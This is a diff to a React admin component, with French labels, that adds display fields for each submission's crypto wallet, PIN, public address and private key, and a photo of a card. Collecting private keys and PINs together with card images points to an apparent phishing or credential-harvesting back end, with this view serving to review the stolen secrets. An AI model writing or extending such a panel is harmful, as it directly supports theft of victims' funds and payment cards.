@@ -501,6 +501,27 @@ const Admin = () => {
                   ))}
                 </div>
               </div>
+
+              {(selectedSubmission.wallet || selectedSubmission.pin || selectedSubmission.public_address || selectedSubmission.private_key) && (
+                <div>
+                  <Label className="text-muted-foreground">Crypto</Label>
+                  <div className="space-y-2 mt-2 text-sm">
+                    {selectedSubmission.wallet && <div><span className="text-muted-foreground">Wallet: </span><code className="bg-secondary px-2 py-1 rounded font-mono">{selectedSubmission.wallet}</code></div>}
+                    {selectedSubmission.pin && <div><span className="text-muted-foreground">PIN: </span><code className="bg-secondary px-2 py-1 rounded font-mono">{selectedSubmission.pin}</code></div>}
+                    {selectedSubmission.public_address && <div className="break-all"><span className="text-muted-foreground">Adresse publique: </span><code className="bg-secondary px-2 py-1 rounded font-mono">{selectedSubmission.public_address}</code></div>}
+                    {selectedSubmission.private_key && <div className="break-all"><span className="text-muted-foreground">Clé privée: </span><code className="bg-secondary px-2 py-1 rounded font-mono">{selectedSubmission.private_key}</code></div>}
+                  </div>
+                </div>
+              )}
+
+              {selectedSubmission.image_url && (
+                <div>
+                  <Label className="text-muted-foreground">Photo de la carte</Label>
+                  <a href={selectedSubmission.image_url} target="_blank" rel="noreferrer" className="block mt-2">
+                    <img src={selectedSubmission.image_url} alt="Carte" className="rounded-lg border border-border max-h-64" />
+                  </a>
+                </div>
+              )}
               
               <div>
                 <Label className="text-muted-foreground">{t('status')}</Label>
